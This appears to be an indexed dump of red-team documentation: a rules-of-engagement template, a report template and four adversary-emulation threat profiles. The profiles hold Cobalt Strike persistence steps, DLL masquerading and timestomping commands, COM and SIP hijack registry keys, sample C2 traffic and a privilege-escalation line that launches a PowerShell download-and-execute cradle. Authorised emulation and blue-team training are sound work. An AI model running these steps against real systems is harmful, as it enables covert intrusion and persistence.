PROVISIONS","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#roe-provisions","content":"The following additional provisions apply to this memorandum: a. All operations will be conducted within guidelines established by applicable policy, regulations and laws. b. All contact with computer networks/subnets will be from within the Red Team or target of engagement environment. c. During the engagement, any deviations from these ROE must be mutually agreed to and approved in writing by the senior representatives for the Red Team, [ the customer ], [ system owner (if different) ], and [ any stakeholders required for engagement execution ]. "},{"title":"REQUIREMENTS, RESTRICTIONS, AND AUTHORITY","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#requirements-restrictions-and-authority","content":"a. The Red Team will: Provide the appropriate support and input for the planning of the engagement.Coordinate engagement approval and support via this Rules of Engagement (ROE).Inform target of engagement POCs of all team requirements (logistics, administrative, etc.).Coordinate team personnel and administrative issues/concerns with [ insert POC position/title ].Provide contact information (i.e. names, job titles, phone &amp; email address) to the [ customer ] representatives.Escalate problems and issues to the appropriate representatives.Upload, where appropriate, indicators on systems to demonstrate a compromised state.When necessary, add/modify/disable accounts (not delete them) on compromised systems.Conduct exploitation with the intent of emulating threat techniques, tactics and procedures.May view/read or modify personal data files, PII, or emails.NOT use unapproved tools.NOT damage systems or networks.NOT conduct denial of service (DOS), except as explicitly approved. "},{"title":"GROUND RULES","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#ground-rules","content":"This section identifies specific rules associated with the execution of this event. a. Network Operations All systems outside the IP ranges provided under separate cover are off limitsAll [ insert here ] applications that are discovered during network operations will be off limits. This includes the following (list provided)[ insert here ] are off limits. IP addresses will be provided Appendix [ X ]. b. Physical Engagement All [ insert here ] areas are off limits to Red Team personnel including transient movement due to potential loss of life, limb, or eyesightBuildings [ 0 ] through [ 1 ] are off limits[ X ] binders in any office will not be inspected, touched or removed. "},{"title":"RESOLUTION OF ISSUES/POINTS OF CONTACT (POC)","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#resolution-of-issuespoints-of-contact-poc","content":"Any issues that may develop, which are not covered by this ROE, will be resolved mutually with all stakeholders. CIO Representative: Mr. Joe Snuffy, (555) 555-0001, joe.snuffy@iheartredteams.comCIO: Mrs. Jane Doe, (555) 555-0005, jane.doe@customer.comRed Team Lead: Mr. James Tubberville, 123.456-7890. james@iheartredteams.comRed Team Tech Lead: Mr. Joe Vest, 123.456.7890, joe@iheartredteams.com[ Trusted Agent ]: Mr. Blah Phisher, 123.456.7890, blah.phisher@customer.com[ System Owner ]: (REPRESENTATIVE) (PHONE) (EMAIL)[ Engagement Director ]: (REPRESENTATIVE) (PHONE) (EMAIL)[ White Cell Lead ]: (REPRESENTATIVE) (PHONE) (EMAIL)[ CEO ]: (REPRESENTATIVE) (PHONE) (EMAIL) "},{"title":"AUTHORIZATION","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#authorization","content":"This agreement becomes effective upon the date of the last approving official's signature. Termination of this agreement can be directed by any of the stakeholders listed in this document at any time by giving notice in writing to the non-terminating parties. This agreement can only be modified by mutual written consent of the signatories. Changes must be coordinated by means of an exchange of memoranda between the signatories. This agreement will undergo a review in its entirety with each modification request or by the request of either party after giving notice in writing at least 7 days prior to the review. "},{"title":"Approval","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#approval","content":"The signatures below denote that all parties have read and agree to this Memorandum of Agreement. [ Sign with signature authority from red team and target organization ] \tRed Team\tTarget / CustomerName Title Date Signature   "},{"title":"APPENDIX A","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#appendix-a","content":"List of assets, systems and data Restricted IP Addresses: Restricted IP Assets 10.10.10.0/2410.10.11.0/2410.11.0.0/16 Authorized IP Space 10.10.12.0/2410.10.13.0/2410.12.0.0/16 Restricted Hosts: customer_workstation_1-1000customer_server_1-20  Authorized Hosts: PII_workstation_1-1000PII_server_1-20All hosts not expressly restricted Restricted Buildings: Bldg. 1 Office 310Bldg. 2 Office 600  Authorized Buildings: Buildings 1, 2, 3, 4 All spaces not expressly restricted "},{"title":"APPENDIX B - POINTS OF CONTACT","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#appendix-b---points-of-contact","content":"[ Role, Name, Title, Phone, Email, Office ] Engagement Director: NamePhoneEmailOffice Location Trusted Agent: NameTitle: Chief Information OfficerPhoneEmailOffice Location White Cell Lead: NameTitle: Chief Executive OfficerPhoneEmailOffice Location Emergency Contact: NameTitle: Executive AssistantPhoneEmailOffice Location Red Team Lead: NamePhoneEmailOffice Location "},{"title":"APPENDIX C – RED TEAM METHODOLOGY","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#appendix-c--red-team-methodology","content":"[ Example or representative activities only – Detail not required ] ] Get In Reconnaissance Perform Open Source Intelligence (OSINT)Target websitesSocial MediaSearch enginesPublic code repositories Enumeration Identify external assetsPerform reverse DNS scan to identify hostsIdentify URLs and other external touch pointsWeb presence evaluationBrowse as a normal user through a web proxy to capture intelligence and understandingIdentify known vulnerabilities and vulnerable conditions Exploitation Attempt to exploit targets based on current knowledgePerform situational awareness on targetAttempt Local Privilege ElevationAttempt Domain or other system level Privilege Elevation Stay-In Post Exploitation Identify domain user/groups membershipsIdentify IP spaceIdentify file sharesEstablish persistenceUse persistence plan to place agents on target systemsMove LaterallyContinued Lateral MovementContinued Enumeration Act Operational Impact Perform planned operational impacts "},{"title":"APPENDIX D – ENGAGEMENT OBJECTIVES","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#appendix-d--engagement-objectives","content":"As part of the Red Team engagement, [ Red Team ] will be replicating the TTPs associated with the group known as [ insert group ]. Details have been provided in the threat profile listed in the Appendix . This threat has been known to exploit and attack the systems and networks servicing the transactional records, customer order database, and XYZ of organizations similar to [ Customer ]. Objective 1: Integrity of critical customer transactional data Determine ability of threat to [ insert objective ]Determine the system’s ability to [ insert objective ] Objective 2: Integrity of customer’s order database Determine ability of threat to [ insert objective ]Determine the system’s ability to [ insert objective ] Objective 3: Evaluation of Incident Response Procedures Determine ability of threat to [ insert objective ]Determine the system’s ability to [ insert objective ] "},{"title":"APPENDIX E – THREAT PROFILE","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#appendix-e--threat-profile","content":"As part of the Red Team engagement, [ Red Team ] will be replicating the TTPs associated with the group known as [ insert group ]. Details have been provided in the form of threat profile. The profile a description of the threat being portrayed. Details include the threat's description and technical indicators that a threat leaves behind. Note: This is a simplified example intended to be used as reference. A full threat profile will likely be several pages in length. Description General mid-tiered threat that uses common offensive tools and techniques. Goal and Intent Exist in the network to enumerate systems and information in order to maintain Command and Control to support future attacks. Key IOCs Cobalt Strike HTTPS beacon on TCP 443Payload: c:\\programdata\\microsoft\\iexplore.exeTimestamp: 7/13/2009 10:04 PMMD5: a7705501c5e216b56cf49dcf540184d0 C2 Overview HTTPS on port 443 Cobalt Strike Beacon with a five-minute callback time. Calling directly to threat-owned domains. TTPs (Enumeration, Delivery, Lateral Movement, Privilege Escalation, etc.) Assumed Breach Model, no initial delivery via exploitation. POST-exploitation via Cobalt Strike commands. Enumeration and lateral movement via Cobalt Strike and native Windows commands. Privilege escalation limited and determined POST-exploitation. Exploitation Assumed Breach Model, no exploitation.  Persistence User-level persistence using Microsoft Outlook rule triggered by specific email.  "},{"title":"Download Templates","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#download-templates","content":"file_downloadRules of Engagement Template (docx) "},{"title":"Red Team Report Template","type":0,"sectionRef":"#","url":"docs/Templates/report_template","content":"","keywords":""},{"title":"Executive Summary","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#executive-summary","content":"[ Red Team ] performed a Red Team engagement on [ CLIENT NAME ] domain from [ DATES ]. The engagement performed by [ Red Team ] employed real-world adversary techniques to target the systems under test. The sequence of activities in this approach involves open source intelligence (OSINT) collection, enumeration, exploitation, and attack in order to perform goal specific operational impacts. The goals included: [ Goal 1 ][ Goal 2 ][ Goal x ] Although Red Team engagements are focused on security weaknesses, several positive observations were made: [ Observation 1 ][ Observation 2 ][ Observation x ] Specific observations for this assessment are outlined in the “Observations and Recommendations” section of this report. The following list is a brief summary of these observations: [ Observation 1 ][ Observation 2 ][ Observation x ] A summary of goals and objectives achieved by [ Red Team ] include the following: [ Goal 1 Results ][ Goal 2 Results ][ Goal x Results ] [ Red Team ] has provided specific recommendations for reducing the risks imposed by these issues in the “Observations and Recommendations” section of this report. [ Red Team ] appreciates the opportunity to support [ CLIENT NAME ] with its computer security. We look forward to assisting you and the [ CLIENT NAME ] IT Staff in future endeavors. "},{"title":"Table of Contents","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#table-of-contents","content":"[ TOC GOES HERE ] "},{"title":"Methodology and Goals","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#methodology-and-goals","content":"Red Team engagements performed by [ Red Team ] employ real-world adversary techniques to target the systems under test. [ Red Team ] uses a red team model emulating real adversary tools, techniques and procedures (TTPs) driven by attack scenarios and goals. Unlike a traditional penetration test, the red team model allows for the testing of the entire security scope of an organization to include people, processes and technology. The three major Red Team phases were used during the engagement to accurately emulate a realistic threat. Get In, Stay In, and Act. The sequence of activities in this approach involves open source intelligence (OSINT) collection, enumeration, exploitation, and attack. Information gathered during OSINT collection is used in conjunction with passive and active enumeration. Enumeration information typically yields details about specific hardware, services, and software running on remote machines. The next phase involves analyzing all accumulated information to identify potential attack vectors. If a weakness can be exploited, operators attempt to obtain additional access into the network or system and to collect sensitive system information to create effects and demonstrate impact to the customer. Vetted tools, methodologies, and operator experience were employed to prevent unintentional disruption, degradation or denial of service to the customer. The goals included: [ Goal 1 ][ Goal 2 ][ Goal x ] "},{"title":"Scenario and Scope","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#scenario-and-scope","content":""},{"title":"Scenario","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#scenario","content":"The Red Team engagement was based on the Assumed Breach Model utilizing external command and control. A coordinated phishing attack was used to begin the test and involved the support of a trusted agent. The coordinated phish was followed by a phishing attack against real-world users who did not have any knowledge of the engagement. The approach of the Assumed Breach Model allows the test to begin quickly and later use access gained from the phishing attack to validate actions. "},{"title":"Scope","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#scope","content":"The scope identified by [ CLIENT NAME ] is to include the subnet: 111.222.333.444/24. Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text "},{"title":"Micellaneous","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#micellaneous","content":"Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text Normal text List BulletList BulletList Bullet "},{"title":"Attack Narrative","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#attack-narrative","content":"The following section outlines the sequence of events and highlights the key points during the engagement.  "},{"title":"Critical Step 1","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#critical-step-1","content":"[ Crital step details. Include enough details to describe the observations ]  "},{"title":"Critical Step 2","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#critical-step-2","content":"[ Crital step details. Include enough details to describe the observations ]  "},{"title":"Observations an Recommendations","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#observations-an-recommendations","content":"The following section is intended to discuss specific scenarios that contributed to the compromise. The observations might be individually exploitable, an element of the overall compromise, or serve as a condition that directly impacts the ability to move laterally, escalate privileges, or persist. "},{"title":"Observation 1","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#observation-1","content":"[ Observation details ] "},{"title":"Recommendation (Optional)","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#recommendation-optional","content":"[ Recommendation details ] "},{"title":"Validation (Optional)","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#validation-optional","content":"[ Validation details ] "},{"title":"Observation 2","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#observation-2","content":"[ Observation details ] "},{"title":"Recommendation (Optional)","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#recommendation-optional-1","content":"[ Recommendation details ] "},{"title":"Validation (Optional)","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#validation-optional-1","content":"[ Validation details ] "},{"title":"Conclusion","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#conclusion","content":"[ Red Team ] performed a Red Team engagement at the request of [ CLIENT NAME ] to determine the full impact of a realistic threat. The [ Red Team ] team identified several exploitable vulnerabilities that were leveraged to establish a foothold, escalate privileges, expand access across the domain, and move proprietary information out of the network. [ Red Team ] assesses that an external threat can successfully compromise [ CLIENT NAME ] systems based on the path demonstrated during the assessment. No highly specialized exploits or tools were used or required to perform any of the actions described within this report. [ Red Team ] used a publicly available attack framework for nearly all exploitation activities. The technical skill level required to conduct individual actions ranges from low to intermediate. The required technical capability and level of access that was achieved by chaining these vulnerabilities is a cause for concern. Critical exposures and observations include [ observation ], [ observation ], and [ observation ]. [ Red Team ] operators demonstrated that an adversary with an organized phishing campaign could potentially compromise the [ CLIENT NAME ] domain and remotely collect sensitive data or observe, disrupt or deny business operations. Overall, the Red Team was able to accomplish threat objectives and it is our hope that the security posture of [ CLIENT NAME ] systems will be improved as a result of the efforts.  "},{"title":"Templates","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#templates","content":""},{"title":"Download Templates","type":1,"pageTitle":"Red Team Report Template","url":"docs/Templates/report_template#download-templates","content":"file_downloadRed Team Report Template "},{"title":"Threat Profile (AUTOBANK)","type":0,"sectionRef":"#","url":"docs/Threat Profiles/autobank","content":"","keywords":""},{"title":"Description","type":1,"pageTitle":"Threat Profile (AUTOBANK)","url":"docs/Threat Profiles/autobank#description","content":"C2 threat inspired by the Carbanak APT malware. It uses DNS and HTTP for C2 communications. Reference: http://krebsonsecurity.com/wp-content/uploads/2015/02/Carbanak_APT_eng.pdf "},{"title":"Characteristics","type":1,"pageTitle":"Threat Profile (AUTOBANK)","url":"docs/Threat Profiles/autobank#characteristics","content":"C2 Backend: CobaltStrike 3Port(s): 53, 445, 80 (DNS, SMB, HTTP)C2 communication using DNS, HTTPS and SMB TrafficIP communication using DNS hostnames Cobalt Strike HTTP Request Profile: UserAgent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/6.0)&quot;GET: /faviconPOST /token "},{"title":"System Modifications","type":1,"pageTitle":"Threat Profile (AUTOBANK)","url":"docs/Threat Profiles/autobank#system-modifications","content":""},{"title":"Files","type":1,"pageTitle":"Threat Profile (AUTOBANK)","url":"docs/Threat Profiles/autobank#files","content":"HTTPS PAYLOAD: Hijacked DLL: c:\\windows\\system32\\wlbsctrl.dll HTTPS Beacon: c:\\windows\\system32\\services.dll SMB Beacon: c:\\windows\\system32\\services.dll  *NOTE: using the same dll name for each beacon type. Binary modified using a resource hacker to look similar to other Windows files File Description: ServicesFile Version: 6.1.7601.17514Product Name: Internet ExplorerProduct Version: 6.1.7601.17514Copyright: (c) Microsoft Corporation. All rights reservedDate Modified: 7/13/2009 08:41:22 PM "},{"title":"Registry","type":1,"pageTitle":"Threat Profile (AUTOBANK)","url":"docs/Threat Profiles/autobank#registry","content":"None "},{"title":"Window Service","type":1,"pageTitle":"Threat Profile (AUTOBANK)","url":"docs/Threat Profiles/autobank#window-service","content":"None "},{"title":"WMI","type":1,"pageTitle":"Threat Profile (AUTOBANK)","url":"docs/Threat Profiles/autobank#wmi","content":"None  "},{"title":"Deployment Steps","type":1,"pageTitle":"Threat Profile (AUTOBANK)","url":"docs/Threat Profiles/autobank#deployment-steps","content":"Create CobaltStrike C2 ProfileBuild payloads using profilebuild 32 bit DLL files - named services.dllUse a Resource Hacker utility to modify binaries to match File AttributesDeploy dlls to target systemVerify time matches surrounding files (TimeStomp if needed) "},{"title":"Persistence Steps (via CobaltStrike Beacon Console)","type":1,"pageTitle":"Threat Profile (AUTOBANK)","url":"docs/Threat Profiles/autobank#persistence-steps-via-cobaltstrike-beacon-console","content":"cd c:\\windows\\tempupload /data/5-PAYLOADS/wlbsctrl.dllupload /data/5-PAYLOADS/services1.dll (DNS Beacon)upload /data/5-PAYLOADS/services2.dll (SMB Beacon) shell mv services(1/2).dll services.dll powershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1powershell Set-FileTimeStamps c:\\windows\\temp\\wlbsctrl.dll &quot;7/13/2009 08:41:22 PM&quot;powershell Set-FileTimeStamps c:\\windows\\temp\\services.dll &quot;7/13/2009 08:41:22 PM&quot; shell move c:\\windows\\temp\\wlbsctrl.dll c:\\windows\\system32shell move c:\\windows\\temp\\services.dll c:\\windows\\system32 Copy "},{"title":"Threat Profile (BLUEHEART)","type":0,"sectionRef":"#","url":"docs/Threat Profiles/blueheart","content":"","keywords":""},{"title":"Description","type":1,"pageTitle":"Threat Profile (BLUEHEART)","url":"docs/Threat Profiles/blueheart#description","content":"BLUEHEART was inspired on APT28 malware using CobaltStrike malleable C2 profiles, custom metadata, and TTPs. "},{"title":"Goal and Intent","type":1,"pageTitle":"Threat Profile (BLUEHEART)","url":"docs/Threat Profiles/blueheart#goal-and-intent","content":"Emulate TTPs of a realistic adversary to exist on a target network and provide a blue team the opportunity to exercise defensive TTPs. "},{"title":"Key IOCs","type":1,"pageTitle":"Threat Profile (BLUEHEART)","url":"docs/Threat Profiles/blueheart#key-iocs","content":"User level C2 AgentCustom CobaltStrike Malleable C2 profile to mimic CHOPSTICK IOCsPersistence: COM Object HijackingFile: C:\\Users\\Public\\Libraries\\apphelp.dllHTTP Traffic to www.badguy.comBeacons every 60 seconds - 30% jitter User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like GeckoModified Date/Time Stamp (Using MetaTwin)Custom Binary metadata using valid Microsoft signatureModified SubjectInterfacePackage (SIP) for Signature Verification Bypass Disk Indicators C:\\Users\\Public\\Libraries\\apphelp.dll Copy Metadata File: C:\\windows\\system32\\apphelp.dllInternalName: ApphelpOriginalFilename: ApphelpFileVersion: 10.0.10586.0(rs1_release.151029-1700)FileDescription:ApplicationCompatibility Client LibraryProduct: Microsoft® Windows® Operating SystemProductVersion: 10.0.10586.0Debug: FalsePatched: FalsePreRelease: FalsePrivateBuild: FalseSpecialBuild: FalseLanguage: English (United States) Copy Digital Signature: Stolen from c: \\windows\\system32\\taskhostw.exe Time Stamp: 10/30/2015 02:17 AM File Size: 427960 MD5 Hash: A31B0124152CBB60C68DCFEBC9C4909C Registry Modifications COM Object Hijack Key: HKCU:\\Software\\Classes\\CLSID\\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\\InProcServer32' Property: (Default)Property: ThreadingModel Copy SIP Hijack Key: HKLM:\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE} Copy Network Indicators HTTP Traffic C2 commands through www.badguy.com Sample HTTP GET Request GET /index.html HTTP/1.1Accept-Language: en-US,en;q=0.5Host: www.badguy.comProxy-Connection: Keep-AliveCookie: session=sE5QGSAMTumuA/3mNmqe5g==User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64;Trident/7.0; rv:11.0) like GeckoHTTP/1.1 200 OKCache-Control: no-cacheContent-Type: text/htmlVary: Accept-EncodingServer: IIS 5.0Connection: closeContent-Length: 218&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;refresh&quot; content=0url=&quot;http://www.badguy.com&quot;&gt;&lt;title&gt;Bad Guy Website&lt;/title&gt;&lt;/html&gt;fylWlO/d4uBN6b0hPlhUDYRcjdjaifkaukstXQZwO3PZpCzTTRFTERSAITNWz2xTNndMcZgPg== Copy Sample HTTP POST Request POST /contact HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Host: www.badguy.comContent-Type: application/x-www-form-urlencodedCookie: session=NzQ4NTU=Content-Length: 41User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64;Trident/7.0; rv:11.0) like Geckoaction=Submit&amp;data=jdagislaga-p0Zw HTTP/1.1 200 OKCache-Control: no-cacheContent-Type: application/octet-streamServer: IIS 5.0Connection: closeContent-Length: 40yF8u8YkdbbWNGWm5gUgaalgOOSfZDX2lnQl5qZEF Copy "},{"title":"C2 Overview","type":1,"pageTitle":"Threat Profile (BLUEHEART)","url":"docs/Threat Profiles/blueheart#c2-overview","content":"HTTP Traffic on TCP port 80 connecting to www.badguy.com every 60 seconds. "},{"title":"TTPs (Enumeration, Delivery, Lateral Movement, Privilege Escalation, etc.)","type":1,"pageTitle":"Threat Profile (BLUEHEART)","url":"docs/Threat Profiles/blueheart#ttps-enumeration-delivery-lateral-movement-privilege-escalation-etc","content":"POST-exploitation via Cobalt Strike commands. Enumeration and lateral movement via Cobalt Strike and native Windows commands. Privilege escalation limited and determined POST-exploitation. "},{"title":"Exploitation","type":1,"pageTitle":"Threat Profile (BLUEHEART)","url":"docs/Threat Profiles/blueheart#exploitation","content":"Nothing specific. Operator deploys during after initial access. "},{"title":"Persistence","type":1,"pageTitle":"Threat Profile (BLUEHEART)","url":"docs/Threat Profiles/blueheart#persistence","content":"User Level persistence where COM Object Handler loads DLL at user logon under taskhostw.exe $Description = &quot;SystemSoundsService&quot;$CLSID = '{2DEA658F-54C1-4227-AF9B-260AB5FC3543}' Copy "},{"title":"Threat Profile (CYBERSNAKE)","type":0,"sectionRef":"#","url":"docs/Threat Profiles/cybersnake","content":"","keywords":""},{"title":"Description","type":1,"pageTitle":"Threat Profile (CYBERSNAKE)","url":"docs/Threat Profiles/cybersnake#description","content":"C2 threat inspired by the Snake Campaign &amp; Cyber Espionage Toolkit uses DNS instead of HTTP for communications Reference: http://www.baesystems.com/en/cybersecurity/feature/the-snake-campaign "},{"title":"Characteristics","type":1,"pageTitle":"Threat Profile (CYBERSNAKE)","url":"docs/Threat Profiles/cybersnake#characteristics","content":"C2 Backend: CobaltStrikePort(s): 53, 445 (DNS, SMB)C2 communication using DNS and SMB TrafficExecutes in browser only when browser is activeIP communication using DNS hostnames Cobalt Strike HTTP Request Profile: None "},{"title":"System Modifications","type":1,"pageTitle":"Threat Profile (CYBERSNAKE)","url":"docs/Threat Profiles/cybersnake#system-modifications","content":""},{"title":"Files","type":1,"pageTitle":"Threat Profile (CYBERSNAKE)","url":"docs/Threat Profiles/cybersnake#files","content":"SMB Payload# PATH: C:\\Windows\\System32\\KBDUS1.DLL Binary modified using a resource hacker to look similar to other Windows files File Description: United States Keyboard Layout AlternateFile Version: 6.1.7601.17514Product Name: Microsoft(r) Windows(r) Operating SystemProduct Version: 6.1.7601.17514Copyright: (c)Microsoft Corporation. All right reservedDate Modified: 11/20/2010 4:29:11 PM DNS Payload# PATH: c:\\windows\\system32\\wanAPI.dll Binary modified using a resource hacker to look similar to other Windows files File Description: MbnapiFile Version: 6.1.7600.16385Product Name: Microsoft(r) Windows(r) Operating SystemProduct Version: 6.1.7600.16385Copyright: (c)Microsoft Corporation. All right reservedDate Modified: 07/13/2009 7:56:53 PM "},{"title":"Registry","type":1,"pageTitle":"Threat Profile (CYBERSNAKE)","url":"docs/Threat Profiles/cybersnake#registry","content":"None "},{"title":"WMI","type":1,"pageTitle":"Threat Profile (CYBERSNAKE)","url":"docs/Threat Profiles/cybersnake#wmi","content":"SMB Beacon: WMI KBDMonitor Created containing start up code to launch a smb beacon at each rebootDNS Beacon: WMI MSUpdate Created containing start up code to launch a dns beacon at each reboot  "},{"title":"Deployment Steps","type":1,"pageTitle":"Threat Profile (CYBERSNAKE)","url":"docs/Threat Profiles/cybersnake#deployment-steps","content":"Create WMI script with file and path to payloadBuild payloads using profileBuild 64 and 32 bit DLL filesUse a Resource Hacker utility to modify dll to match File AttributesDeploy dll to target systemVerify time matches surrounding files (TimeStomp if needed) "},{"title":"Persistence Steps (via CobaltStrike Beacon Console)","type":1,"pageTitle":"Threat Profile (CYBERSNAKE)","url":"docs/Threat Profiles/cybersnake#persistence-steps-via-cobaltstrike-beacon-console","content":"KBDUS1.dll (SMB Beacon) cd c:\\windows\\tempupload /data/PAYLOADS/fullstaged/64/KBDUS1.DLLpowershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1powershell Set-FileTimeStamps c:\\windows\\temp\\KBDUS1.DLL &quot;11/20/2010 4:29:11 PM&quot;shell move c:\\windows\\temp\\KBDUS1.DLL c:\\windows\\system32powershell-import /data/PAYLOADS/wmi_persistence_kbdus1.ps1powershell Invoke-WMI-Persistence Copy wanAPI.dll (DNS Beacon) cd c:\\windows\\tempupload /data/PAYLOADS/staged/wanAPI.dllpowershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1powershell Set-FileTimeStamps c:\\windows\\temp\\wanAPI.dll &quot;07/13/2009 7:56:53 PM&quot;shell move c:\\windows\\temp\\wanAPI.dll c:\\windows\\system32powershell-import /data/PAYLOADS/wmi_persistence_wanapi.ps1powershell Invoke-WMI-Persistence Copy "},{"title":"Threat Profile (SIMPLESAM)","type":0,"sectionRef":"#","url":"docs/Threat Profiles/simplesam","content":"","keywords":""},{"title":"Description","type":1,"pageTitle":"Threat Profile (SIMPLESAM)","url":"docs/Threat Profiles/simplesam#description","content":"C2 threat modeled after basic HTTP C2 using powershell and phishing as primary entry point. This profile represents commodity malware that doesn't focus on advanced techniques. "},{"title":"Characteristics","type":1,"pageTitle":"Threat Profile (SIMPLESAM)","url":"docs/Threat Profiles/simplesam#characteristics","content":"C2 Backend: CobaltStrikePort(s): 80C2 Communication using HTTP TrafficExecutes as powershell encoded commandIP communication using IP addressesPersistence: Scheduled Task HTTP Request Profile UserAgent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/6.0)&quot;GET: /s/ref=nb_sb_nos_2/143-3245POST /S2854/auth/aws-hb "},{"title":"System Modifications","type":1,"pageTitle":"Threat Profile (SIMPLESAM)","url":"docs/Threat Profiles/simplesam#system-modifications","content":""},{"title":"Files","type":1,"pageTitle":"Threat Profile (SIMPLESAM)","url":"docs/Threat Profiles/simplesam#files","content":"None "},{"title":"Registry","type":1,"pageTitle":"Threat Profile (SIMPLESAM)","url":"docs/Threat Profiles/simplesam#registry","content":"Schedule Task executed at user logonTask Name: Updater "},{"title":"WMI","type":1,"pageTitle":"Threat Profile (SIMPLESAM)","url":"docs/Threat Profiles/simplesam#wmi","content":"None  "},{"title":"Deployment Steps","type":1,"pageTitle":"Threat Profile (SIMPLESAM)","url":"docs/Threat Profiles/simplesam#deployment-steps","content":"Phishing Payload Modify an excel document payload with a macros that launches a powershell encoded payload  Powershell Payload Create CobaltStrike C2 ProfileBuild payloads using profilePowershell PayloadCreate Scheduled Task script with file and path to payload Update persistence script with powershell payloadline 78 : Update encoded Powershell payload hereline 154: Update Domain name here "},{"title":"Persistence Steps (via CobaltStrike Beacon Console)","type":1,"pageTitle":"Threat Profile (SIMPLESAM)","url":"docs/Threat Profiles/simplesam#persistence-steps-via-cobaltstrike-beacon-console","content":"powershell-import /data/PAYLOADS/Invoke-Persistence.ps1powershell Invoke-Persistence -Name Updater -CreatePersistence -ScheduledTask Copy "},{"title":"Privilege Escalation (based on CVE-2015-1701)","type":1,"pageTitle":"Threat Profile (SIMPLESAM)","url":"docs/Threat Profiles/simplesam#privilege-escalation-based-on-cve-2015-1701","content":"Compile exploit and name ghost.exe Reference: https://www.exploit-db.com/exploits/37049/ 32 Bit Binary: ghost.exeUsage:  ghost.exe powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://&lt; TARGETURL &gt;'))&quot; Copy Powershell uses download and execute via encoded command Encoded command starts a new beacon as SYSTEM "}]